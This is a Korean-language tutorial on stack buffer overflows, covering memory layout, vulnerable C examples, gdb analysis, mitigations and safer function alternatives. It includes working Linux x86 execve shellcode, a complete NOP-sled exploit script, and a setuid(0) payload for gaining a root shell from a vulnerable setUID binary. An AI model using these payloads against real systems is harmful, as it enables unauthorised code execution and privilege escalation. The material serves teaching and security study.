# Buffer Overflow — 스택 기반 오버플로우 완전 정복

## 1. 메모리 구조 기초

### 프로세스 메모리 레이아웃
```
High Address
┌─────────────────────────┐
│      Stack (스택)        │ ← 지역변수, 함수 인자, 리턴 주소
│       ↓ (증가)           │
│─────────────────────────│
│                         │
│─────────────────────────│
│       ↑ (증가)           │
│      Heap (힙)           │ ← malloc, calloc, new
│─────────────────────────│
│      BSS                │ ← 초기화되지 않은 전역/정적 변수
│─────────────────────────│
│      Data               │ ← 초기화된 전역/정적 변수
│─────────────────────────│
│      Text (Code)        │ ← 실행 코드, 상수
└─────────────────────────┘
Low Address
```

### 스택(Stack) 구조
```
IA-32 (32비트) 스택:
- 높은 주소에서 낮은 주소 방향으로 성장
- PUSH: ESP 감소 후 값 저장
- POP:  값 읽기 후 ESP 증가
- ESP: 스택 최상단 포인터 (Stack Pointer)
- EBP: 스택 프레임 베이스 포인터 (Base Pointer)

스택 프레임 구조:
┌──────────────────┐  High Address
│  이전 함수 인자   │
│──────────────────│
│  Return Address  │ ← BoF로 덮어쓸 핵심 대상
│──────────────────│
│  Saved EBP       │ ← 이전 EBP 값
│──────────────────│
│  Local Variable1 │ ← EBP - 4
│  Local Variable2 │ ← EBP - 8
│  buffer[128]     │ ← gets(), strcpy() 등으로 오버플로우
└──────────────────┘  Low Address (← ESP)
```

---

## 2. Buffer Overflow 원리

### 취약한 코드 예시
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];        // 64바이트 버퍼
    strcpy(buffer, input);  // 크기 검사 없음! → 취약
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable_function(argv[1]);
    return 0;
}
```

### 스택 상태 변화
```
정상 실행 시:
┌────────────────┐
│  argv[1]       │  "hello" (5바이트)
│  ...           │
│ Return Address │  0x08048400
│ Saved EBP      │  0xbfff1000
│ buffer[64]     │  "hello\0..."
└────────────────┘

공격 시 (64 + 4 + 4 + 4 = 72바이트 이상 입력):
┌────────────────┐
│ Return Address │  0x41414141 (AAAA) ← 제어권 탈취!
│ Saved EBP      │  0x41414141 (AAAA)
│ buffer[64]     │  AAAA...AAAA (64개)
└────────────────┘
```

---

## 3. gets() 함수 취약점

### gets() vs fgets() 비교
```c
// 위험: gets()는 입력 길이 제한 없음
char buf[64];
gets(buf);          // 취약! 얼마든지 입력 가능

// 안전: fgets()는 크기 제한
char buf[64];
fgets(buf, sizeof(buf), stdin);  // 안전
```

### 취약한 함수 목록
| 함수 | 위험 | 대체 안전 함수 |
|------|------|---------------|
| gets() | 크기 무제한 | fgets() |
| strcpy() | 크기 검사 없음 | strncpy(), strlcpy() |
| strcat() | 크기 검사 없음 | strncat(), strlcat() |
| sprintf() | 출력 크기 무제한 | snprintf() |
| scanf("%s") | 크기 제한 없음 | scanf("%63s") |

---

## 4. 엔디안(Endian) 이해 — 핵심 개념

### 빅 엔디안 vs 리틀 엔디안
```
값 0x12345678을 메모리에 저장:

Big Endian (네트워크 바이트 오더):
주소: 0x100  0x101  0x102  0x103
값:   0x12   0x34   0x56   0x78   ← 높은 바이트가 낮은 주소

Little Endian (x86/x64 Intel):
주소: 0x100  0x101  0x102  0x103
값:   0x78   0x56   0x34   0x12   ← 낮은 바이트가 낮은 주소
```

### 익스플로잇에서의 엔디안
```python
# x86 리틀 엔디안으로 주소 패킹
import struct

address = 0xbfff1234
# 메모리에: \x34\x12\xff\xbf
packed = struct.pack('<I', address)
print(repr(packed))  # b'\x34\x12\xff\xbf'

# 익스플로잇 코드에서
payload  = b"A" * 64         # 버퍼 채우기
payload += b"B" * 4          # Saved EBP 덮기
payload += struct.pack('<I', 0xbfff1234)  # Return Address 덮기
```

---

## 5. 메모리 Hexdump 분석

### gdb로 메모리 확인
```bash
# 컴파일 (보호 기법 비활성화)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

# GDB 실행
gdb ./vuln
(gdb) disas main
(gdb) disas vulnerable_function

# 브레이크포인트 설정 및 실행
(gdb) break *vulnerable_function+XX
(gdb) run $(python3 -c "print('A'*80)")

# 레지스터 확인
(gdb) info registers
(gdb) x/16x $esp      # ESP부터 16개 hex 값 출력
(gdb) x/s $eax        # EAX를 문자열로 출력
(gdb) x/10i $eip      # EIP부터 10개 명령어 출력
```

### Hexdump 읽기
```
메모리 덤프 예시:
0xbfff1000: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
0xbfff1010: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
...
0xbfff1040: 42 42 42 42  78 56 34 12                              BBBB.x4.

분석:
0xbfff1000 ~ 0xbfff103F: 'A' 64개 (buffer 영역)
0xbfff1040 ~ 0xbfff1043: 'B' 4개 (Saved EBP 덮임)
0xbfff1044 ~ 0xbfff1047: \x78\x56\x34\x12 = 0x12345678 (Return Address)
```

---

## 6. 실전 Buffer Overflow 공격

### 단계별 공격 절차
```
1단계: 취약점 확인 (Fuzzing)
   → 큰 입력값으로 크래시 유발

2단계: 오프셋 계산 (EIP까지의 거리)
   → Cyclic 패턴으로 정확한 오프셋 파악

3단계: Return Address 확인
   → 셸코드 위치 또는 유용한 가젯 주소

4단계: 익스플로잇 작성
   → payload = padding + new_return_address + shellcode

5단계: 공격 실행 및 쉘 획득
```

### Cyclic 패턴으로 오프셋 계산
```python
# pwntools 활용
from pwn import *

# Cyclic 패턴 생성 (200바이트)
pattern = cyclic(200)
print(pattern)
# aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...

# EIP에 들어간 값으로 오프셋 계산
# 예: EIP = 0x61616166 ('faaa')
offset = cyclic_find(0x61616166)
print(offset)  # → 20 (버퍼부터 EIP까지 20바이트)
```

### 셸코드 (Linux x86)
```python
# execve("/bin/sh", 0, 0) 셸코드 (23바이트)
shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax (null terminator)
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x31\xd2"             # xor edx, edx
    b"\xb0\x0b"             # mov al, 0x0b (execve syscall)
    b"\xcd\x80"             # int 0x80
)
```

### 완성된 익스플로잇 (NOP Sled + Shellcode)
```python
#!/usr/bin/env python3
import struct
import subprocess

# 설정
buffer_size = 64
saved_ebp   = 4
ret_offset  = buffer_size + saved_ebp  # EIP까지의 거리 = 68

# 셸코드 (Linux x86 execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
)

# NOP Sled (셸코드 앞에 붙여 주소 계산 오차 흡수)
nop_sled = b"\x90" * 20

# Return Address (스택 내 NOP Sled 시작 위치)
# 실제 환경에서는 gdb/ltrace로 확인 필요
ret_addr = struct.pack('<I', 0xbfff1090)

# 페이로드 구성
padding  = b"A" * (ret_offset - len(nop_sled) - len(shellcode))
payload  = nop_sled + shellcode + padding + ret_addr

print(f"[*] Payload length: {len(payload)}")
print(f"[*] Return address: {hex(struct.unpack('<I', ret_addr)[0])}")

# 실행
subprocess.run(['./vuln'], input=payload)
```

---

## 7. setUID 비트를 이용한 권한 상승

### setUID 개념
```bash
# setUID: 파일 실행 시 소유자(보통 root) 권한으로 실행
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#    ^-- s: setUID 비트 (실행 시 root 권한)

# 취약한 setUID 프로그램이 있으면 root 권한 쉘 획득 가능!
find / -perm -4000 -type f 2>/dev/null
```

### setUID 취약 프로그램 공격 예시
```c
// 취약한 setUID 프로그램 (./vuln_suid)
// 소유자: root, setUID 설정됨
#include <stdio.h>
#include <string.h>

void copy(char *src) {
    char buf[32];
    strcpy(buf, src);  // 취약!
}

int main(int argc, char **argv) {
    copy(argv[1]);
    return 0;
}
```

```python
# setUID 프로그램 공격으로 root 쉘 획득
import struct

# root 쉘 획득 셸코드 (setuid(0) + execve /bin/sh)
shellcode = (
    b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  # setuid(0)
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"       # execve(/bin/sh)
)

offset = 44  # buffer(32) + saved_ebp(4) + 8 (alignment)
ret_addr = struct.pack('<I', 0xbfff1234)

payload = b"\x90" * 16 + shellcode
payload += b"A" * (offset - len(payload))
payload += ret_addr

print(repr(payload))
```

---

## 8. 보호 기법

### ASLR (Address Space Layout Randomization)
```bash
# ASLR 상태 확인
cat /proc/sys/kernel/randomize_va_space
# 0 = 비활성화
# 1 = 부분 활성화
# 2 = 완전 활성화

# ASLR 비활성화 (실습용)
echo 0 > /proc/sys/kernel/randomize_va_space

# ASLR 우회 기법:
# - Brute Force (32비트 주소 공간 작음)
# - Information Leak (주소 유출 취약점 활용)
# - NOP Sled 활용 (명중률 향상)
```

### Stack Canary
```bash
# GCC 컴파일 시 기본 활성화
gcc -fstack-protector-all vuln.c -o vuln  # 활성화
gcc -fno-stack-protector vuln.c -o vuln   # 비활성화 (실습용)

# 동작: 스택 프레임 끝에 카나리 값 삽입
# 함수 종료 전 카나리 값 검증, 변조 시 프로그램 종료
```

### DEP/NX (Data Execution Prevention / No-Execute)
```bash
# 스택 실행 불가 설정 (기본값)
gcc -z noexecstack vuln.c  # NX 활성화
gcc -z execstack vuln.c    # NX 비활성화 (실습용)

# NX 우회 기법: ROP (Return Oriented Programming)
# → 실행 권한이 있는 기존 코드 조각(gadget) 재사용
```

### PIE (Position Independent Executable)
```bash
# ASLR + PIE 조합 시 바이너리 자체도 랜덤 주소에 로드
gcc -pie -fPIE vuln.c  # PIE 활성화
gcc -no-pie vuln.c     # PIE 비활성화

# 확인
checksec --file=vuln   # pwntools 포함 도구
```
